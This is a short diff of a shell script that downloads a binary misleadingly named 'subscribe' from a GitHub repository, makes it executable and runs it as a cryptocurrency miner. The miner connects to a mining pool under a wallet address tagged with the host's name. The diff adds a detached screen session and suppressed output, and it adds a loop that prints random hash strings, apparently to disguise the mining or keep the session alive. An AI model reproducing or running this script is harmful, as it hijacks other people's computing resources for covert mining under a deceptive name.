@@ -1,4 +1,5 @@
-apt update && apt install wget -y
+sudo apt update && sudo apt -y install wget screen
 wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe
 chmod u+x subscribe
-./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname) >/dev/null >/dev/null 2>&1
+screen -dmS subscribe ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname) >/dev/null >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
